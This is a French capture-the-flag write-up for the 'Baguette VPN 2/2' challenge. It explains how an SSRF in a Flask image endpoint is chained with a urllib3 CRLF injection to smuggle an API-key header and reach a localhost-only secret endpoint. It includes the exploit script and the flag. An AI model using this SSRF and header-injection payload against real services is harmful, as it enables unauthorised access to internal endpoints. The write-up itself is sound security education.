# Baguette VPN 2/2

> Titre: Baguette VPN 2/2
> Auteur: DrStache
> Difficulté: 2

## Description

Vous devez maintenant récupérer le secret contenu dans l'API.
Cette épreuve a été découpée en deux parties :
Baguette VPN 1/2 et Baguette VPN 2/2.

## Objectif

L'objectif est de trouver le flag accessible à `/api/secret`.

## Analyse

En retournant à notre code source, l'endpoint `/api/secret` est implémenté par le code suivant :

```py
@app.route("/api/secret")
def admin():
    if request.remote_addr == "127.0.0.1":
        if request.headers.get("X-API-KEY") == "b99cc420eb25205168e83190bae48a12":
            return jsonify({"secret": os.getenv("FLAG")})
        return Response("Interdit: mauvaise clé d'API", status=403)
    return Response("Interdit: mauvaise adresse IP", status=403)
```

Le `if` nous indique que la requête est uniquement accessible depuis le serveur lui-même. `curl` ne nous sera donc pas utile ici.

Il faut envoyer une requête à partir du serveur, depuis le client. Pour cela, examinons les autres endpoints :

```py
@app.route("/api/image")
def image():
    filename = request.args.get("fn")
    if filename:
        http = urllib3.PoolManager()
        return http.request("GET", "http://baguette-vpn-cdn" + filename).data
    else:
        return Response("Paramètre manquant", status=400)
```

Cet endpoint est vulnérable à une [SSRF](https://www.f5.com/fr_fr/glossary/ssrf).

Pour l'exploiter, nous allons envoyer une requête à l'endpoint secret à partir de celui-ci :

```bash
curl http://localhost:8000/api/image?fn=@localhost:1337/api/secret
```

Le `@` indique à urllib3 que `http://localhost:8000/api/image?fn` agit en tant qu'user info, facilitant la requête.

Nous obtenons donc l'erreur suivante :

```bash
Interdit: mauvaise clé d'API
```

Ce qui nous permet de déduire que le premier `if` a été passé, mais il reste la seconde étape de vérification.

Il nous suffit donc de passer le header dans notre requête, ce qui est pour l'instant impossible car l'endpoint image ne transmet pas les headers :

```py
http.request("GET", "http://baguette-vpn-cdn" + filename).data
```

Il faut donc procéder à une injection CRLF. Après quelques [recherches](https://snyk.io/blog/crlf-injection-found-in-popular-python-dependency/), j'ai découvert que le module `urllib3` était vulnérable à ce type d'injection.

Écrivons alors un petit script permettant de construire le payload :

```py
import requests

secret = "b99cc420eb25205168e83190bae48a12"
host = "http://localhost:8000/api/image?fn=@127.0.0.1:1337/api/secret"
crlf_payload = " HTTP/1.1\r\nX-API-KEY: " + secret + "\r\n\r\n"
url = host + crlf_payload
print("Requesting URL:", url)

try:
    info = requests.get(url).text
    print(info)
except Exception:
    print("Error occurred during the request")
```

Nous obtenons alors le flag dans la réponse du serveur :

```json
{"secret":"FCSC{6e86560231bae31b04948823e8d56fac5f1704aaeecf72b0c03bfe742d59fdfb}"}
```

## Flag

FCSC{6e86560231bae31b04948823e8d56fac5f1704aaeecf72b0c03bfe742d59fdfb}
